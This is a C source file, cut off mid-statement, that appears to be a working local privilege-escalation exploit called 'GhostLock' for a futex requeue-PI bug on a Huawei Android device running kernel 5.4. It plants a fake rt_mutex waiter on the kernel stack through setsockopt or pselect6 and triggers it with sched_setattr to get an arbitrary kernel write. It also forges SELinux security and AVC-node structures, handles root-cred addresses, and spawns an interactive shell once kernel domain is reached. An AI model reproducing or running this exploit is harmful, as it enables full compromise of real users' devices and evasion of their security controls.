#include "common.h"

/* GhostLock (CVE-2026-43499) write test on HUAWEI DBY2-W00 (5.4.86).
 *
 * Chain:
 *   1. PI-cycle trigger: the waiter blocks on f_wait via
 *      FUTEX_WAIT_REQUEUE_PI whose target is held by the owner thread;
 *      CMP_REQUEUE_PI then walks the cycle and returns -EDEADLK.  The buggy
 *      rollback remove_waiter() clears `current`'s pi_blocked_on instead of
 *      the waiter's, so the waiter's pi_blocked_on keeps pointing at its
 *      kernel-stack rt_waiter W = E - 0x1b0 (E = syscall-entry SP of the
 *      waiter thread).
 *
 *   2. Carrier: setsockopt(fd, SOL_IP, MCAST_BLOCK_SOURCE=43, buf, 0x108).
 *      do_ip_setsockopt() copies the 0x108-byte group_source_req to sp+0x20;
 *      the real LTO build has this copy destination at E-0x260:
 *      __arm64_sys_setsockopt(0x70) + sock_common_setsockopt(0x40) +
 *      udp_setsockopt(0x10) + ip_setsockopt(0x30) +
 *      do_ip_setsockopt(0x190) - local destination 0x20.
 *      do_futex is inlined from futex_wait_requeue_pi and keeps its waiter
 *      at E-0x1b0, so buf+0xb0 lands exactly on the stale waiter.
 *
 *   3. TIF mitigation before the carrier: touch FPU (clear
 *      TIF_FOREIGN_FPSTATE), sched_yield (consume TIF_NEED_RESCHED), touch
 *      FPU again.  The carrier's syscall return path then skips
 *      do_notify_resume(), whose frame would clobber waiter->lock at W+0x38
 *      with the leftover schedule LR 0xffffffXX08e8a0 (reproduced in QEMU).
 *
 *   4. Park: return to user space and busy-spin.  pselect6, rt_sigsuspend,
 *      and any other blocking syscall can schedule deeply enough to overwrite
 *      the waiter window.  The parent polls carrier_done without sleeping and
 *      fires sched_setattr immediately, before a CFS preemption can reuse the
 *      waiter thread's kernel stack.
 *
 *   5. Trigger: sched_setattr(waiter, SCHED_BATCH, nice) ->
 *      __sched_setscheduler -> rt_mutex_adjust_pi(waiter) ->
 *      rt_mutex_adjust_prio_chain walks the fake waiter;
 *      rt_mutex_dequeue's rb_erase does *(tree_left) = tree_parent_color,
 *      i.e. sysctl_bootid = &loggers[0][1].
 *
 *   6. Verification: /proc/sys/kernel/random/boot_id first 8 bytes must equal
 *      the write value.
 *
 * QEMU note: kernel.patched needs --probe-cycle (the value-based PI cycle);
 * the LOCK_PI arrangement returns -EBADF there while the value cycle returns
 * -EDEADLK.
 */

/* Keep the effective fair priority unchanged while policy toggling still
 * reaches rt_mutex_adjust_pi(). Lowering nice here makes check_class_changed()
 * preempt the carrier before the PI walk and overwrites its stack waiter. */
#define SLIDE_TRIGGER_NICE 0
/* Fake rt_mutex slot for the current attempt: zero page + n*0x30.
 * Every walk must use a *fresh* slot -- it leaves waiters.root/leftmost
 * pointing at this attempt's waiter, so reusing a slot makes the next walk
 * dereference the previous attempt's freed kernel stack (BUG_ON(w->lock !=
 * lock) in rt_mutex_top_waiter(), reproduced in QEMU with --verify-all). */
static int lock_slot;
static int write_path_failed;

/* Key the ledger on /proc/stat btime.  boot_id is modified by the read8
 * restore path, so a later process can mistake the same boot for a new one
 * and reuse dirty slot 0. */
static char lock_slot_key[64];
static int lock_slot_key_cached;

static void read_lock_slot_key(void) {
  FILE *stat_file = fopen("/proc/stat", "r");
  if (stat_file) {
    char line[128];
    while (fgets(line, sizeof(line), stat_file)) {
      unsigned long long boot_time = 0;
      if (sscanf(line, "btime %llu", &boot_time) == 1) {
        snprintf(lock_slot_key, sizeof(lock_slot_key), "btime-%llu",
                 boot_time);
        fclose(stat_file);
        return;
      }
    }
    fclose(stat_file);
  }

  /* Keep the ledger usable if /proc/stat is unavailable. */
  read_first_line("/proc/sys/kernel/random/boot_id", lock_slot_key,
                  sizeof(lock_slot_key));
}

/* Slots must be allocated across processes: a slot is one-shot until reboot,
 * and a process-local counter restarts at 0 in the next run (e.g. the
 * wrapper's second group), handing the walk a dirty lock.  Keep the next free
 * slot in a small file keyed by boot_id: a reboot resets the .bss pool and
 * therefore the counter.  Falls back to the process-local counter when the
 * file cannot be used. */
static int lock_slot_alloc(void) {
  const char *path = (g_opts.slot_file && g_opts.slot_file[0])
                         ? g_opts.slot_file
                         : "/data/local/tmp/gl.slot";
  if (!lock_slot_key_cached) {
    read_lock_slot_key();
    lock_slot_key_cached = 1;
  }
  const char *boot_key = lock_slot_key;
  unsigned slot = (unsigned)lock_slot;
  int fd = open(path, O_RDWR | O_CREAT | O_CLOEXEC, 0600);
  if (fd >= 0) {
    char buf[96] = {0};
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    if (n > 0) {
      char fb[64] = {0};
      unsigned fs = 0;
      if (sscanf(buf, "%63s %u", fb, &fs) == 2 && boot_key[0] &&
          !strcmp(fb, boot_key)) {
        slot = fs;
      } else {
        slot = 0; /* first run after a reboot */
      }
    }
    if (slot >= SLIDE_LOCK_SLOTS) {
      close(fd);
      return -1;
    }
    if (ftruncate(fd, 0) == 0) {
      lseek(fd, 0, SEEK_SET);
      (void)!dprintf(fd, "%s %u\n", boot_key, slot + 1);
    }
    close(fd);
    lock_slot = (int)slot + 1;
    return (int)slot;
  }
  if (slot >= SLIDE_LOCK_SLOTS) {
    return -1;
  }
  return lock_slot++;
}

static uint64_t cur_lock;
static uint64_t waiter_abs;
static uint64_t waiter_task;
uint64_t slide_root_cred;
uint64_t slide_fake_security_addr;
uint64_t slide_fake_avc_node_addr;
static int slide_kernel_domain_applied;
static int kernel_shell_pipe[2] = {-1, -1};
static char kernel_shell_tty[128];

static void *kernel_shell_waiter_thread(void *arg __attribute__((unused))) {
  (void)prctl(PR_SET_NAME, "glkshellw", 0, 0, 0);
  char ready = 0;
  if (read(kernel_shell_pipe[0], &ready, 1) != 1) {
    return NULL;
  }
  sleep(6);
  pid_t shell_process = fork();
  if (shell_process == 0) {
    close(kernel_shell_pipe[0]);
    close(kernel_shell_pipe[1]);
    if (kernel_shell_tty[0]) {
      int tty_fd = open(kernel_shell_tty, O_RDWR | O_NOCTTY | O_CLOEXEC);
      if (tty_fd >= 0) {
        (void)dup2(tty_fd, 0);
        (void)dup2(tty_fd, 1);
        (void)dup2(tty_fd, 2);
        if (tty_fd > 2) {
          close(tty_fd);
        }
      }
    }
    int proof_fd = open("/sdcard/gl-kernel-proof.txt",
                        O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
    if (proof_fd >= 0) {
      (void)!write(proof_fd, "kernel domain reached\n", 22);
      close(proof_fd);
    }
    const char *proof_command =
        "echo kernel_shell_ok > /sdcard/gl-kernel-shell-proof.txt";
    const char *shell_execs[] = {
      "/system/bin/shex",
      "/system/bin/shs",
    };
    for (size_t i = 0; i < sizeof(shell_execs) / sizeof(shell_execs[0]); i++) {
      execl(shell_execs[i], shell_execs[i], "-c", proof_command, (char *)NULL);
      dprintf(1, "kernel-shell-waiter: exec %s errno=%d\n", shell_execs[i],
              errno);
    }
    const char *exec_paths[] = {
      "/system/bin/sh",
      "/system/bin/toybox",
      "/system/bin/toolbox",
      "/vendor/bin/sh",
      "/system/bin/debuggerd",
      "/system/bin/init",
    };
    for (size_t i = 0; i < sizeof(exec_paths) / sizeof(exec_paths[0]); i++) {
      execl(exec_paths[i], exec_paths[i], "sh", "-i", (char *)NULL);
      dprintf(1, "kernel-shell-waiter: exec %s errno=%d\n", exec_paths[i],
              errno);
    }
    _exit(127);
  }
  dprintf(1, "kernel-shell-waiter: forked shell pid=%d\n",
          (int)shell_process);
  for (;;) {
    pause();
  }
  return NULL;
}

static void start_kernel_shell_waiter(void) {
  if (!g_opts.kernel_shell || kernel_shell_pipe[0] >= 0) {
    return;
  }
  if (pipe(kernel_shell_pipe) != 0) {
    return;
  }
  (void)ttyname_r(0, kernel_shell_tty, sizeof(kernel_shell_tty));
  pthread_t helper;
  if (pthread_create(&helper, NULL, kernel_shell_waiter_thread, NULL) == 0) {
    pthread_detach(helper);
  }
}

static void arm_kernel_shell_waiter(void) {
  if (kernel_shell_pipe[1] >= 0) {
    (void)!write(kernel_shell_pipe[1], "R", 1);
  }
}

static uint32_t f_wait, f_pi_target, f_pi_chain;
static atomic_int waiter_ready, waiter_waiting, owner_started, carrier_done;
static atomic_int carrier_failed;
static atomic_int carrier_park_result;
static atomic_int waiter_tid;
static atomic_int trigger_started, trigger_finished;
static sigjmp_buf waiter_early_jmp;
static uint64_t dbg[16]; /* [0] requeue ret [1] requeue errno [2] trigger ret
                            [3] wait ret [4] wait errno [5] carrier ret
                            [6] carrier errno [7] trigger errno
                            [8] wait f_wait before [9] wait f_wait after
                            [10] cmp f_wait before [11] cmp f_wait after
                            [12..15] signal si_signo/code/pid/uid */
static uint64_t mcast_buf[MCAST_OPT_LEN / 8] __attribute__((aligned(4096)));
static uint64_t write_value;
static uint64_t write_target;
static int cur_shape; /* SHAPE_* for the payload built by the waiter thread */
static const struct write_test *cur_test; /* spec of the running test */

/* Write shapes (rb_erase cases, see target.h):
 *   POINTER: tree = {value, rb_right=0, rb_left=target} -> Case 2 writes
 *            *(target) = value (single left child), then
 *            __rb_change_child stores `target` at value+8 (side effect).
 *   LEAF:    tree = {target-8, 0, 0} -> Case 1 has no child; parent =
 *            (target-8) & ~3 and __rb_change_child writes NULL at target.
 *            pc low bit = target's low bit = 0 (aligned targets) -> RED ->
 *            no rebalance pass.  Single clean zero store. */
enum { SHAPE_POINTER = 0, SHAPE_LEAF = 1, SHAPE_NOOP = 2 };

struct write_test {
  const char *name;
  int shape;
  int check_uuid;
  uint64_t value;   /* SHAPE_POINTER */
  uint64_t target;
  int check_lo;     /* verify low half of the boot_id readback */
  int check_hi;
  uint64_t exp_lo;
  uint64_t exp_hi;
  int dynamic_fake_security;
  int dynamic_fake_avc_node;
  uint16_t dynamic_fake_avc_class;
};

static void touch_fpu(void) {
  /* Keep the store alive so -O2 cannot eliminate the FP work. */
  volatile double fp_clear = 1.0;
  fp_clear = fp_clear * 3.141592653589793 + 0.577215664901532;
  (void)fp_clear;
}

static void waiter_early_wake_handler(int signal_number, siginfo_t *signal_info,
                                      void *context) {
  (void)context;
  dbg[12] = (uint64_t)signal_number;
  if (signal_info) {
    dbg[13] = (uint64_t)signal_info->si_code;
    dbg[14] = (uint64_t)signal_info->si_pid;
    dbg[15] = (uint64_t)signal_info->si_uid;
  }
  siglongjmp(waiter_early_jmp, 1);
}

static void prepare_waiter_signal_mask(void) {
  sigset_t all;
  sigfillset(&all);
  sigdelset(&all, SLIDE_EARLY_WAKE_SIGNAL);
  pthread_sigmask(SIG_BLOCK, &all, NULL);
}

static void raise_rt(int prio) {
  struct sched_param sp;
  memset(&sp, 0, sizeof(sp));
  sp.sched_priority = prio;
  if (syscall(SYS_sched_setscheduler, (int)syscall(SYS_gettid),
              SCHED_FIFO, &sp) != 0) {
    pr_warning("slide waiter RT prio=%d errno=%d (CFS fallback)\n",
               prio, errno);
  }
}

static int pin_waiter_to_runtime_cpu(void) {
  long configured = sysconf(_SC_NPROCESSORS_CONF);
  if (configured <= 0 || configured > CPU_SETSIZE) {
    configured = CPU_SETSIZE;
  }

  /* The shell process starts pinned to CPU0.  On this device, widening the
   * mask in one step and then selecting the performance core is accepted by
   * sched_setaffinity(), while selecting CPU6 directly from the inherited
   * single-CPU mask returns EINVAL. */
  cpu_set_t all_cpus;
  CPU_ZERO(&all_cpus);
  for (int cpu = 0; cpu < configured; cpu++) {
    CPU_SET(cpu, &all_cpus);
  }
  if (sched_setaffinity(0, sizeof(all_cpus), &all_cpus) != 0) {
    pr_warning("slide waiter affinity widen failed errno=%d\n", errno);
    return 0;
  }

  int target_cpu = runtime_cpu >= 0 ? runtime_cpu : CORE;
  cpu_set_t target;
  CPU_ZERO(&target);
  CPU_SET(target_cpu, &target);
  if (sched_setaffinity(0, sizeof(target), &target) == 0) {
    return 1;
  }

  int target_errno = errno;
  cpu_set_t allowed;
  if (sched_getaffinity(0, sizeof(allowed), &allowed) != 0) {
    pr_warning("slide waiter affinity query failed errno=%d\n", errno);
    return 0;
  }

  for (int cpu = (int)configured - 1; cpu >= 0; cpu--) {
    if (cpu == CORE || !CPU_ISSET(cpu, &allowed)) {
      continue;
    }
    CPU_ZERO(&target);
    CPU_SET(cpu, &target);
    if (sched_setaffinity(0, sizeof(target), &target) == 0) {
      pr_info("slide waiter affinity fallback cpu=%d (wanted=%d errno=%d)\n",
              cpu, target_cpu, target_errno);
      return 1;
    }
  }

  pr_warning("slide waiter has no safe non-core CPU; refusing unsafe walk\n");
  return 0;
}

/* pselect6(..., 320, ...) copies five 64-bit words per input set into
 * core_sys_select()'s stack_fds array. On this arm64 5.4 build, waiter word 0
 * lands at global word 10, so tree/pi words 0..4 fit in the input except set.
 * The task and lock words land in res_in words 1 and 2; make the fds named by
 * those pointer bitmaps readable, and do_select() restores the pointers into
 * res_in before returning. The remaining result words stay zero, which is a
 * valid prio/deadline shape for this walk. */
#define SELECT_CARRIER_NFDS 320
#define SELECT_CARRIER_WORDS 16
#define SELECT_CARRIER_WAITER_BASE_WORD 10

static unsigned long select_input_set[SELECT_CARRIER_WORDS];
static unsigned long select_output_set[SELECT_CARRIER_WORDS];
static unsigned long select_except_set[SELECT_CARRIER_WORDS];
static int select_ready_source = -1;

static void select_zero_sets(void) {
  memset(select_input_set, 0, sizeof(select_input_set));
  memset(select_output_set, 0, sizeof(select_output_set));
  memset(select_except_set, 0, sizeof(select_except_set));
}

static void select_put_global_word(int global_word, uint64_t value) {
  if (global_word < 0) {
    return;
  }
  if (global_word < 5) {
    ((uint64_t *)select_input_set)[global_word] = value;
  } else if (global_word < 10) {
    ((uint64_t *)select_output_set)[global_word - 5] = value;
  } else if (global_word < 15) {
    ((uint64_t *)select_except_set)[global_word - 10] = value;
  }
}

static int duplicate_high(int source, int minimum) {
  int duplicated = fcntl(source, F_DUPFD_CLOEXEC, minimum);
  if (duplicated < 0) {
    return -1;
  }
  return duplicated;
}

static void release_select_value_fds(void);

static int prepare_select_value_fds(void) {
  int ready_pipe[2];
  if (pipe(ready_pipe) != 0) {
    return 0;
  }

  select_ready_source = duplicate_high(ready_pipe[0], 700);
  close(ready_pipe[0]);
  close(ready_pipe[1]);
  if (select_ready_source < 0) {
    release_select_value_fds();
    return 0;
  }

  unsigned char ready_fd[SELECT_CARRIER_NFDS] = {0};
  for (int fd = 0; fd < SELECT_CARRIER_NFDS; fd++) {
    int word = fd / 64;
    int bit = fd % 64;
    if (((select_input_set[word] >> bit) & 1) ||
        ((select_output_set[word] >> bit) & 1) ||
        ((select_except_set[word] >> bit) & 1)) {
      ready_fd[fd] = 1;
    }
  }

  for (int fd = 0; fd < SELECT_CARRIER_NFDS; fd++) {
    if (ready_fd[fd]) {
      if (dup2(select_ready_source, fd) < 0) {
        release_select_value_fds();
        return 0;
      }
    }
  }
  return 1;
}

static void release_select_value_fds(void) {
  if (select_ready_source >= 0) close(select_ready_source);
  select_ready_source = -1;
}

static int run_select_carrier(void) {
  uint64_t waiter[11] = {0};
  waiter[0] = (cur_shape == SHAPE_LEAF) ? write_target - 8 : write_value;
  waiter[1] = 0;
  waiter[2] = (cur_shape == SHAPE_POINTER) ? write_target : 0;
  waiter[6] = waiter_task ? waiter_task : canon_addr(SLIDE_INIT_TASK_IMAGE);
  waiter[7] = cur_lock;

  select_zero_sets();
  for (int index = 0; index <= 6; index++) {
    select_put_global_word(SELECT_CARRIER_WAITER_BASE_WORD + index,
                           waiter[index]);
  }
  /* res_in words 1 and 2 are the task and lock fields. Their input bitmaps
   * must contain exactly the pointer bits; those fds are made readable. */
  ((uint64_t *)select_input_set)[1] = waiter[6];
  ((uint64_t *)select_input_set)[2] = waiter[7];
  if (!prepare_select_value_fds()) {
    return -1;
  }

  /* Clear the two return-path flags before the select syscall writes the
   * stack_fds window. The select call itself follows immediately. */
  touch_fpu();
  (void)syscall(SYS_sched_yield);
  touch_fpu();

  struct timespec timeout;
  memset(&timeout, 0, sizeof(timeout));
  errno = 0;
  long result = syscall(SYS_pselect6, SELECT_CARRIER_NFDS, select_input_set,
                        select_output_set, select_except_set, &timeout, NULL);
  dbg[5] = (uint64_t)result;
  dbg[6] = (uint64_t)(uint32_t)errno;
  release_select_value_fds();
  return (int)result;
}

static void park_carrier_after_trigger(void) {
  while (!atomic_load(&trigger_finished)) {
    __asm__ volatile("yield" ::: "memory");
  }
  for (;;) {
    __asm__ volatile("yield" ::: "memory");
  }
}

static int move_fd_high(int *fd, int minimum) {
  int duplicated = fcntl(*fd, F_DUPFD_CLOEXEC, minimum);
  if (duplicated < 0) {
    return 0;
  }
  close(*fd);
  *fd = duplicated;
  return 1;
}

/* Fake rt_mutex_waiter (11 words, 5.4 + CONFIG_HW_FUTEX_PI) at
 * buf+mcast_waiter_off:
 *   +0x00 tree.__rb_parent_color = shape-dependent (write value / target-8)
 *   +0x08 tree.rb_right          = 0
 *   +0x10 tree.rb_left           = shape-dependent (write target / 0)
 *   +0x18 pi_tree                (unused on this path)
 *   +0x30 task                   = &init_task
 *   +0x38 lock                   = cur_lock (fresh empty_zero_page slot)
 *   +0x40 major_prio/major_only, +0x48 prio, +0x50 deadline = 0           */
static void build_mcast_payload(int shape) {
  uint64_t waiter_offset = g_opts.mcast_waiter_off;
  memset(mcast_buf, 0, sizeof(mcast_buf));
  mcast_buf[1] = 2; /* gsr_group.ss_family = AF_INET (must be AF_INET) */
  /* The family checks run after copy_from_user().  At the DBY2 geometry the
   * source family at 0x88 aliases waiter.rb_right at 0x80 + 0x08, so leaving
   * it zero is required to preserve the rb_erase shape.  The resulting
   * EADDRNOTAVAIL is expected after the payload has already been copied. */
  /* Window mode places the fake rt_mutex one 0x20-byte block below W.  The
   * waiter probe is deliberately independent: recovered W is also needed by
   * the known-good BSS/empty-zero fake-lock slots. */
  if (g_opts.fake_lock_window || g_opts.fake_lock_probed ||
      (cur_test &&
       (cur_test->dynamic_fake_security ||
        cur_test->dynamic_fake_avc_node))) {
    cur_lock = waiter_abs - 0x20;
  }
  uint64_t *w = (uint64_t *)((unsigned char *)mcast_buf + waiter_offset);
  if (shape == SHAPE_NOOP) {
    w[WAITER_TREE_ENTRY_OFF / 8 + 0] = 0;
    w[WAITER_TREE_ENTRY_OFF / 8 + 1] = 0;
    w[WAITER_TREE_ENTRY_OFF / 8 + 2] = 0;
  } else if (shape == SHAPE_LEAF) {
    w[WAITER_TREE_ENTRY_OFF / 8 + 0] = write_target - 8;
    w[WAITER_TREE_ENTRY_OFF / 8 + 1] = 0;
    w[WAITER_TREE_ENTRY_OFF / 8 + 2] = 0;
  } else {
    w[WAITER_TREE_ENTRY_OFF / 8 + 0] = write_value;
    w[WAITER_TREE_ENTRY_OFF / 8 + 1] = 0;
    w[WAITER_TREE_ENTRY_OFF / 8 + 2] = write_target;
  }
  w[WAITER_TASK_OFF / 8] =
      waiter_task ? waiter_task : canon_addr(SLIDE_INIT_TASK_IMAGE);
  w[WAITER_LOCK_OFF / 8] = cur_lock;
  if (cur_test && cur_test->dynamic_fake_security) {
    unsigned char *blob =
        (unsigned char *)mcast_buf + SLIDE_FAKE_SECURITY_BLOB_OFF;
    memset(blob, 0, 24);
    *(uint64_t *)blob = 0x0000000100000001ULL;
  }
  if (cur_test && cur_test->dynamic_fake_avc_node) {
    unsigned char *avc_node =
        (unsigned char *)mcast_buf + SLIDE_FAKE_AVC_NODE_OFF;
    memset(avc_node, 0, SLIDE_FAKE_AVC_NODE_BYTES);
    *(uint32_t *)(avc_node + 0) = SLIDE_ADB_SHELL_SID;
    *(uint32_t *)(avc_node + 4) = SLIDE_ADB_SHELL_SID;
    uint16_t avc_class = (cur_test->dynamic_fake_avc_class != 0)
                             ? cur_test->dynamic_fake_avc_class
                             : SLIDE_SECCLASS_SYSTEM;
    *(uint16_t *)(avc_node + 8) = avc_class;
    *(uint32_t *)(avc_node + 12) = 0xffffffffU;
    *(uint32_t *)(avc_node + 20) = 0xffffffffU;
  }
}

static void *slide_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  if (!pin_waiter_to_runtime_cpu()) {
    atomic_store(&carrier_failed, 1);
    atomic_store(&carrier_done, 1);
    return NULL;
  }
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  struct sigaction early_wake_action;
  memset(&early_wake_action, 0, sizeof(early_wake_action));
  early_wake_action.sa_flags = SA_SIGINFO;
  early_wake_action.sa_sigaction = waiter_early_wake_handler;
  sigemptyset(&early_wake_action.sa_mask);
  if (sigaction(SLIDE_EARLY_WAKE_SIGNAL, &early_wake_action, NULL) != 0) {
    pr_warning("slide waiter sigaction errno=%d\n", errno);
  }

  waiter_abs = 0;
  waiter_task = 0;
  int dynamic_fake_security =
      cur_test && cur_test->dynamic_fake_security;
  int dynamic_fake_avc_node =
      cur_test && cur_test->dynamic_fake_avc_node;
  int dynamic_kernel_blob = dynamic_fake_security || dynamic_fake_avc_node;
  if ((g_opts.fake_lock_window || dynamic_kernel_blob) &&
      !g_opts.fake_lock_probed) {
    waiter_abs = perf_leak_waiter(g_opts.do_futex_waiter_off);
    if (!waiter_abs) {
      pr_warning("perf waiter details: %s\n", perf_waiter_diag);
      pr_error("slide waiter leak failed; refusing unsafe fake lock\n");
      atomic_store(&carrier_failed, 1);
      atomic_store(&carrier_done, 1);
      return NULL;
    }
    if (!dynamic_kernel_blob && perf_mcast_waiter_offset > 0) {
      g_opts.mcast_waiter_off = (uint64_t)perf_mcast_waiter_offset;
    }
    if (!dynamic_kernel_blob) {
      cur_lock = waiter_abs - 0x20;
      pr_info("slide window geometry waiter=%016llx fake_lock=%016llx "
              "copy=%016llx buf_waiter_off=%#llx fake_lock_off=%#x\n",
              (unsigned long long)waiter_abs, (unsigned long long)cur_lock,
              (unsigned long long)perf_mcast_copy_address,
              (unsigned long long)g_opts.mcast_waiter_off,
              (unsigned int)(g_opts.mcast_waiter_off - 0x20));
    }
  }
  if (g_opts.waiter_task_own) {
    waiter_task = perf_leak_task();
    pr_info("slide waiter task own=%016llx\n",
            (unsigned long long)waiter_task);
  }

  /* Open the carrier socket early: after the futex timeout only the
     setsockopt syscall may run before the park. */
  int fd = (int)syscall(SYS_socket, AF_INET, SOCK_DGRAM, 0);
  if (fd < 0) {
    pr_warning("slide carrier socket errno=%d\n", errno);
  }

  /* Any signal delivered while waiting would set TIF_SIGPENDING and pull the
     return path into do_notify_resume() (clobbering the overlay).  The
     trigger only needs the hrtimer timeout, so block everything. */
  prepare_waiter_signal_mask();

  if (g_opts.probe_cycle) {
    /* Probe-verified value-based cycle: the waiter "holds" the chain by
       VALUE (its tid); the owner LOCK_PI's it.  This is what makes
       CMP_REQUEUE_PI return -EDEADLK on kernel.patched (the LOCK_PI
       arrangement returns -EBADF there). */
    __atomic_store_n(&f_pi_chain, (uint32_t)tid, __ATOMIC_RELEASE);
  } else if (futex_op(&f_pi_chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                      0, NULL, NULL, 0) != 0) {
    pr_warning("slide waiter LOCK_PI(chain) errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  if (g_opts.rt_prio > 0) {
    raise_rt(g_opts.rt_prio);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += g_opts.wait_seconds;

  int wait_waiter_probe =
      g_opts.fake_lock_probed && perf_wait_waiter_probe_begin();
  atomic_store(&waiter_waiting, 1);
  dbg[8] = (uint64_t)__atomic_load_n(&f_wait, __ATOMIC_RELAXED);
  errno = 0;
  long wr;
  if (sigsetjmp(waiter_early_jmp, 1) == 0) {
    wr = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                  0, &timeout, &f_pi_target, 0);
  } else {
    wr = -EINTR;
    errno = EINTR;
  }
  dbg[3] = (uint64_t)wr;
  dbg[4] = (uint64_t)(uint32_t)errno;
  dbg[9] = (uint64_t)__atomic_load_n(&f_wait, __ATOMIC_RELAXED);

  if (g_opts.fake_lock_probed) {
    uint64_t remove_waiter_abs =
        __atomic_load_n(&waiter_abs, __ATOMIC_ACQUIRE);
    uint64_t wait_waiter_abs =
        wait_waiter_probe ? perf_wait_waiter_probe_end() : 0;
    waiter_abs = remove_waiter_abs ? remove_waiter_abs : wait_waiter_abs;
    pr_info_sync("slide waiter candidates remove=%016llx wait=%016llx\n",
                 (unsigned long long)remove_waiter_abs,
                 (unsigned long long)wait_waiter_abs);
    if (!waiter_abs) {
      pr_error("slide wait probe did not recover the waiter\n");
      atomic_store(&carrier_failed, 1);
      atomic_store(&carrier_done, 1);
      return NULL;
    }

    uint64_t probed_copy = 0;
    if (!g_opts.skip_copy_probe) {
      probed_copy = perf_probe_mcast_copy_address(waiter_abs);
      if (!probed_copy || waiter_abs <= probed_copy + 0x20) {
        pr_error("slide MCAST copy probe failed waiter=%016llx copy=%016llx\n",
                 (unsigned long long)waiter_abs,
                 (unsigned long long)probed_copy);
        atomic_store(&carrier_failed, 1);
        atomic_store(&carrier_done, 1);
        return NULL;
      }

      uint64_t probed_offset = waiter_abs - probed_copy;
      if ((probed_offset & 7) ||
          probed_offset < 0x20 ||
          probed_offset > MCAST_OPT_LEN - (WAITER_LOCK_OFF + 8)) {
        pr_error("slide MCAST geometry out of range waiter=%016llx "
                 "copy=%016llx offset=%#llx\n",
                 (unsigned long long)waiter_abs,
                 (unsigned long long)probed_copy,
                 (unsigned long long)probed_offset);
        atomic_store(&carrier_failed, 1);
        atomic_store(&carrier_done, 1);
        return NULL;
      }
      g_opts.mcast_waiter_off = probed_offset;
    }

    pr_info_sync(
        "slide probed waiter=%016llx copy=%016llx fake_lock=%016llx "
        "offset=%#llx\n",
        (unsigned long long)waiter_abs, (unsigned long long)probed_copy,
        (unsigned long long)cur_lock,
        (unsigned long long)g_opts.mcast_waiter_off);
  }

  /* The probed path must enter the carrier immediately after WAIT returns.
     A second sched_setscheduler() syscall would overwrite the same kernel
     stack window before MCAST re-plants it. */
  if (!g_opts.fake_lock_probed && g_opts.rt_prio > 0) {
    raise_rt(g_opts.rt_prio);
  }

  if (g_opts.select_carrier) {
    int select_result = run_select_carrier();
    atomic_store(&carrier_park_result,
                 select_result < 0 ? errno : select_result);
    atomic_store(&carrier_done, 1);
    if (g_opts.self_trigger) {
      int self_tid = (int)syscall(SYS_gettid);
      atomic_store(&trigger_started, 1);
      errno = 0;
      dbg[2] = (uint64_t)sched_setattr_tid(self_tid, SLIDE_TRIGGER_NICE);
      dbg[7] = (uint64_t)(uint32_t)errno;
      atomic_store(&trigger_finished, 1);
      for (;;) {
        pause();
      }
    }
    park_carrier_after_trigger();
    return NULL;
  }

  if (g_opts.fake_lock_window && waiter_abs && fd >= 0) {
    build_mcast_payload(SHAPE_NOOP);
    if (perf_mcast_probe_begin()) {
      int probe_successes = 0;
      int probe_einval = 0;
      int probe_other_errors = 0;
      int probe_first_errno = 0;
      for (int probe = 0; probe < 8192; probe++) {
        errno = 0;
        long probe_result =
            syscall(SYS_setsockopt, fd, 0, 43, mcast_buf, MCAST_OPT_LEN);
        if (probe_result == 0) {
          probe_successes++;
        } else if (errno == EINVAL) {
          probe_einval++;
        } else {
          probe_other_errors++;
        }
        if (!probe_first_errno && probe_result != 0) {
          probe_first_errno = errno;
        }
      }
      pr_info("perf mcast probe syscalls: ok=%d einval=%d other=%d first=%d\n",
              probe_successes, probe_einval, probe_other_errors,
              probe_first_errno);
      uint64_t copy_address = perf_mcast_probe_end();
      if (copy_address && waiter_abs > copy_address) {
        uint64_t measured_offset = waiter_abs - copy_address;
        if (measured_offset >= 0x20 &&
            measured_offset <= MCAST_OPT_LEN - 11 * 8) {
          g_opts.mcast_waiter_off = measured_offset;
          pr_info("slide runtime geometry waiter=%016llx copy=%016llx "
                  "offset=%#llx\n",
                  (unsigned long long)waiter_abs,
                  (unsigned long long)copy_address,
                  (unsigned long long)measured_offset);
        } else {
          pr_warning("slide runtime geometry out of range waiter=%016llx "
                     "copy=%016llx offset=%#llx\n",
                     (unsigned long long)waiter_abs,
                     (unsigned long long)copy_address,
                     (unsigned long long)measured_offset);
        }
      }
    }
  }

  if (cur_test &&
      (cur_test->dynamic_fake_security ||
       cur_test->dynamic_fake_avc_node)) {
    uint64_t dynamic_offset = cur_test->dynamic_fake_security
                                  ? SLIDE_FAKE_SECURITY_BLOB_OFF
                                  : SLIDE_FAKE_AVC_NODE_OFF;
    uint64_t dynamic_size = cur_test->dynamic_fake_security
                                ? 0x28
                                : SLIDE_FAKE_AVC_NODE_BYTES;
    if (g_opts.mcast_waiter_off < dynamic_offset + dynamic_size) {
      pr_error("slide dynamic kernel blob overlaps the fake lock\n");
      atomic_store(&carrier_failed, 1);
      atomic_store(&carrier_done, 1);
      return NULL;
    }
    uint64_t copy_base = perf_mcast_copy_address;
    if (!copy_base) {
      copy_base = waiter_abs - g_opts.mcast_waiter_off;
    }
    write_value = copy_base + dynamic_offset;
  }

  /* TIF mitigation + carrier with NO syscall in between (see header). */
  touch_fpu();
  (void)syscall(SYS_sched_yield);
  touch_fpu();

  build_mcast_payload(cur_shape);
  errno = 0;
  long cr = syscall(SYS_setsockopt, fd, 0 /*SOL_IP*/, 43 /*MCAST_BLOCK_SOURCE*/,
                    mcast_buf, MCAST_OPT_LEN);
  dbg[5] = (uint64_t)cr;
  dbg[6] = (uint64_t)(uint32_t)errno;
  atomic_store(&carrier_done, 1);

  if (g_opts.spin_park) {
    /* Entering pselect6 here grows the same kernel stack and overwrites the
     * fake waiter. Returning to userspace is safe if this thread then makes
     * no further syscall before the parent consumes the waiter. */
    park_carrier_after_trigger();
    return NULL;
  }

  /* Park inside the kernel so the overlay cannot be replaced by user-return
   * or scheduler frames before the parent fires sched_setattr().  nfds above
   * 320 keeps the fd sets out of this stack frame. */
  errno = 0;
  long park_result =
